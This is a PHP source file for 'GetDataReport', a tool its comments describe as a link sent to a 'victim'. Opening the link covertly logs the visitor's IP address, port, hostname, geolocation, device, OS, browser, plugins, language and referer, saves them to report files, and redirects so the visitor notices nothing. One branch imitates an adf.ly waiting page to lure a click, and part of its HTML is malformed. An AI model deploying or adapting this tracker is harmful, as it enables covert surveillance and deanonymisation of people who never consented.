<?php
/*
   Coder  : [f][t][@inbox.ru] \ RedToor 
   Project: https://github.com/RedToor/GetDataReport
   Team   : CODETEAM
   Date   : 04/12/2014 
   Date   : 22/12/2014
   Date   : 12/01/2015
   Date   : 13/06/2015
   Date   : 10/09/2015
   Date   : 02/02/2016

    HOW to Works
    to run this script is necessary that the victim has active JavaScript, 
    also for geological location data requires that the victim accepts obtained.

    Sent to target 
                www.host.com/ing.php?id=[target-name]&url=[Redirect]
                as 
                www.host.com/ing.php?id=steven&url=fb.com

                the script save the data in Report-[random number].htm

/* /  use javascript ? true=yes, false=no ----------------------------------*/
/**/  $javascript=false; 
//    New Option www.host.com/ing.php?id=[target-name]&url=[Redirect]&j=true for enable geological location.
/* /  --------------------------------------------------------------------  */

error_reporting(0);
error_log(0);
error_get_last(0);


function java(){
          echo '<script type="text/javascript">
            function pinst(){
            if(navigator.appName.indexOf("Microsoft Internet Explorer") != -1){}else{var num_of_plugins=navigator.plugins.length;for(var i=0;i<num_of_plugins;i++){var list_number=i+1;
            var p="\t  "+list_number+"-"+navigator.plugins[i].name+"<br/>"+p;}}return p;}var p=pinst();
            if(navigator.javaEnabled()==true)
            javaok="Yes";else if(navigator.javaEnabled()==false)
            javaok="No";else
            javaok="Unknow";
            if(navigator.cookieEnabled==true)
            cookiesok="Yes";else if(navigator.cookieEnabled==false)
            cookiesok="No";else
            cookiesok="Unknow";
            var screens=window.screen.height+" Pix height * "+window.screen.width+" Pix width";
            var javas="Screen             : "+screens+"<br>Javascript         : "+javaok+"<br>Cookies            : "+cookiesok+"<br>Plugins            : <br>   "+p;
          </script>';
}

function OS(){
        $system="unKnow";
        $os=array(
            '/Windows NT 10.0/i'    =>  'Windows 10',
            '/windows nt 6.4/i'     =>  'Windows 10',
            '/windows nt 6.3/i'     =>  'Windows 8.1',
            '/windows nt 6.2/i'     =>  'Windows 8',
            '/windows nt 6.1/i'     =>  'Windows 7',
            '/windows nt 6.0/i'     =>  'Windows Vista',
            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP',
            '/windows nt 5.1/i'     =>  'Windows XP',
            '/windows me/i'         =>  'Windows ME',
            '/windows nt 5.0/i'     =>  'Windows 2000',
            '/win98/i'              =>  'Windows 98',
            '/win95/i'              =>  'Windows 95',
            '/windows nt 4.0/i'     =>  'Windows NT 4.0',
            '/windows nt 3.51/i'    =>  'Windows NT 3.51',
            '/windows nt 3.5/i'     =>  'Windows NT 3.5',
            '/windows nt 3.1/i'     =>  'Windows NT 3.1',
            '/windows nt 3.11/i'    =>  'Windows 3.11',
            '/linux/i'              =>  'Linux',
            '/android/i'            =>  'Android',
            '/android 1.6/i'        =>  'Android 1.6',
            '/android 2.0/i'        =>  'Android 2.0',
            '/android 2.0.1/i'      =>  'Android 2.0.1',
            '/android 2.1/i'        =>  'Android 2.1',
            '/android 2.2/i'        =>  'Android 2.2',
            '/android 2.2.1/i'      =>  'Android 2.2.1',
            '/android 2.2.2/i'      =>  'Android 2.2.2',
            '/android 2.2.3/i'      =>  'Android 2.2.3',
            '/android 2.2.4/i'      =>  'Android 2.2.4',
            '/android 2.3/i'        =>  'Android 2.3',
            '/android 2.3.0/i'      =>  'Android 2.0.3',
            '/android 2.3.1/i'      =>  'Android 2.3.1',
            '/android 2.3.3/i'      =>  'Android 2.3.3',
            '/android 2.3.4/i'      =>  'Android 2.3.4',
            '/android 2.3.5/i'      =>  'Android 2.3.5',
            '/android 2.3.6/i'      =>  'Android 2.3.6',
            '/android 2.3.7/i'      =>  'Android 2.3.7',
            '/android 3.0/i'        =>  'Android 3.0',
            '/android 3.1/i'        =>  'Android 3.1',
            '/android 3.2/i'        =>  'Android 3.1',
            '/android 3.2.1/i'      =>  'Android 3.2.1',
            '/android 3.2.2/i'      =>  'Android 3.2.2',
            '/android 3.2.3/i'      =>  'Android 3.2.3',
            '/android 3.2.4/i'      =>  'Android 3.2.4',
            '/android 4.0/i'        =>  'Android 4.0',
            '/android 4.0.0/i'      =>  'Android 4.0.0',
            '/android 4.0.1/i'      =>  'Android 4.0.1',
            '/android 4.0.2/i'      =>  'Android 4.0.2',
            '/android 4.0.3/i'      =>  'Android 4.0.3',
            '/android 4.0.4/i'      =>  'Android 4.0.4',
            '/android 4.2.1/i'      =>  'Android 4.2.1',
            '/android 4.2.2/i'      =>  'Android 4.2.2',
            '/android 4.3/i'        =>  'Android 4.3',
            '/android 4.4/i'        =>  'Android 4.4',
            '/android 4.4.1/i'      =>  'Android 4.4.1',
            '/android 4.4.2/i'      =>  'Android 4.4.2',
            '/android 4.4.3/i'      =>  'Android 4.4.3',
            '/android 4.4.4/i'      =>  'Android 4.4.4',
            '/android 5.0/i'        =>  'Android 5.0',
            '/macintosh|mac os x/i' =>  'Mac OS X',
            '/mac_powerpc/i'        =>  'Mac OS 9',
            '/ubuntu/i'             =>  'Ubuntu',
            '/SymbianOS/i'          =>  'SymbianOS',
            '/iphone/i'             =>  'iPhone',
            '/ipod/i'               =>  'iPod',
            '/ipad/i'               =>  'iPad',
            '/tablet os/i'          =>  'Table OS',
            '/blackberry/i'         =>  'BlackBerry',
            '/bb/i'                 =>  'BlackBerry', 
            '/webos/i'              =>  'Mobile');
        foreach($os as $regex => $value){if(preg_match($regex, $_SERVER['HTTP_USER_AGENT'])){$system=$value;}}return $system;}
function browser(){
        $navegator="unKnow";
        $browser=array(
            '/msie/i'       =>  'Internet Explorer','/firefox/i'    =>  'Firefox'  , '/safari/i'     =>  'Safari',
            '/chrome/i'     =>  'Chrome'           ,'/opera/i'      =>  'Opera'    , '/netscape/i'   =>  'Netscape',
            '/maxthon/i'    =>  'Maxthon'          ,'/BrowserNG/i'  =>  'BrowserNG', '/konqueror/i'  =>  'Konqueror',
            '/ie/i'         =>  'Internet Explorer','/mobile/i'     =>  'Handheld Browser');            
        foreach($browser as $regex => $value){if(preg_match($regex, $_SERVER['HTTP_USER_AGENT'])){$navegator=$value;}}return $navegator;}
function architecture(){
        $arqui="32Bits";
        $architecture=array(
            '/x86_64/i'     => '64Bits', '/amd64/i'     => '64Bits',
            '/x86-64/i'     => '64Bits', '/x64_64/i'    => '64Bits',
            '/x64/i'        => '64Bits', '/WOW64/i'     => '64Bits');
        foreach($architecture as $regex => $value){if(preg_match($regex, $_SERVER['HTTP_USER_AGENT'])){$arqui=$value;}}return $arqui;}
function device($unix){
    $device="Computer";
    $unix=strtoupper($unix);
    if(strstr($unix, 'ANDROID')==true)                              {$device="Phono";}
        elseif(strstr($unix, 'IPHONE')==true)                       {$device="Phono";}
            elseif(strstr($unix, 'BLACKBERRY')==true)               {$device="Phono";}
                elseif(strstr($unix, 'WEBOS')==true)                {$device="Phono";}
                    elseif(strstr($unix, 'SYMBIAOS')==true)         {$device="Phono";}
                        elseif(strstr($unix,'TABLET')==true)        {$device="Tablet";}
                            elseif(strstr($unix, 'IPAD')==true)     {$device="Tablet";}
                                elseif(strstr($unix, 'IPOD')==true) {$device="Portable media players ";}return $device;}

                function getall(){
                                $id=$_GET['id'];
                                $system=browser();
                                $unix=OS();
                                $provetor=gethostbyaddr($_SERVER['REMOTE_ADDR']);
                                $g=unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$_SERVER['REMOTE_ADDR'].''));
                        $data ="<pre>";
                        $data.="Target             : ".$id.                            "<br>";
                        $data.="Ip                 : ".$_SERVER['REMOTE_ADDR'].        "<br>";
                        $data.="Port               : ".$_SERVER['REMOTE_PORT'].        "<br>";
                        $data.="Date               : ".date("F j, Y, g:i a").          "<br>";
                        $data.="Country Name       : ".$g['geoplugin_countryName'].    "<br>";
                        $data.="Region             : ".$g['geoplugin_region'].         "<br>";
                        $data.="City               : ".$g['geoplugin_city'].           "<br>";
                        $data.="Longitude ,no exact: ".$g['geoplugin_longitude'].      "<br>";
                        $data.="Latitude  ,no exact: ".$g['geoplugin_latitude'].       "<br>";
                        $data.="Device             : ".device($unix).                  "<br>";
                        $data.="Operative System   : ".OS().                           "<br>";
                        $data.="Architecture       : ".architecture().                 "<br>";
                        $data.="Browser            : ".browser().                      "<br>";
                        $data.="Language           : ".$_SERVER['HTTP_ACCEPT_LANGUAGE']."<br>";
                        $data.="Provetor           : ".$provetor.                      "<br>";
                        $data.="Referer            : ".$_SERVER['HTTP_REFERER'].       "<br>";
                        $data.="Agent              : ".$_SERVER['HTTP_USER_AGENT'].    "<br>";return $data;}


if($_POST['data']!=""){
    $n=rand(0,9000);
    $data ="<title>GetDataReport[by RedToor]</title><h1>REPORT</h1><br>";
        $datas =getall();
        $datas.=$_POST['data'];
        $datas.=$_POST['geos'];
            $open=fopen("Report-".$n.".htm",'w') or die ('Failed');
                fputs($open,$datas);
                    fclose($open);
    if($_POST['url']!=""){header("location: http://".$_POST['url']);}
}else{

                                if($javascript==false and $_GET['j']==""){
                                java(); ?>
                                <script type="text/javascript">
                                function Red(dates)
                                {
                                    if (window.XMLHttpRequest){
                                        xmlhttp = new XMLHttpRequest();
                                    } else {
                                        xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
                                    }
                                    var params= "data="+dates;
                                    xmlhttp.open("POST","<?php echo $_SERVER['SCRIPT_NAME'];?>",false);
                                    xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                                    xmlhttp.send(params);
                                    return xmlhttp.responseText;    
                                }
                                Red(javas);
                                window.location="http://<?php echo $_GET['url'];?>";
                                </script>
                                <?php }else{?>

<link rel="shortcut icon" href="http://cdn.adf.ly/static/image/favicon.ico"/><head><BODY BGCOLOR="#317EC5">
<meta http-equiv="Content-type" content="text/html; charset=utf-8"/><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
<title>adf!</title><script type="text/javascript" src="http://cdn.adf.ly/static/js/jquery-1.7.1.min.js"></script>
<script type="text/javascript" src="jquery.js"></script>
<style type="text/css">div#adflybar a{text-decoration:none;}.skip{display:none;z-index:2;}#top{width:100%;height:59px;background-image:url("http://cdn.adf.ly/static/image/d_top_bg.png");}#bottom{width:100%;height:17px;background-image:url("http://cdn.adf.ly/static/image/d_bottom_bg2.png");padding-top:2px;}#sitebar{height:78px;vertical-align:middle;position:relative;font-size:12px;}a img{border:0;}a{text-decoration:none;color:#1164b7;}a:hover{color:#f5a431;text-decoration:underline;}</style>
</head><body id='home'><div id='overly' style='background-color: #317EC5;'>
<div style="text-align:center; margin-top: 100px;"><div><img src='http://cdn.adf.ly/static/image/logo.png' border='0' alt='logo'/>
</div><div id="wait" style="display:none;"><div style="color: #FFFFFF; margin-top:20px;"><b>wait <span id="countdown">5</span> ...</div></div>
<div id="continue" style="display:none;"><div style="color: #FFFFFF; margin-top:20px;">
<form action='<?php echo $_SERVER['SCRIPT_NAME'];?>' method=post name=datas><input type=hidden name=geos>
<input type=hidden name=url value="<?php echo $_GET['url'];?>"><input type=hidden name=ver value="yes"<input type=hidden name=id value="<?php echo $id;?>">
<input type=hidden name=data value="true"><a style="color:#FFFFFF;" href="javascript:send()">Click Here.</a> </form></div></div><script type="text/javascript">$('#wait').show();</script><noscript></body></html<?php }} ?>
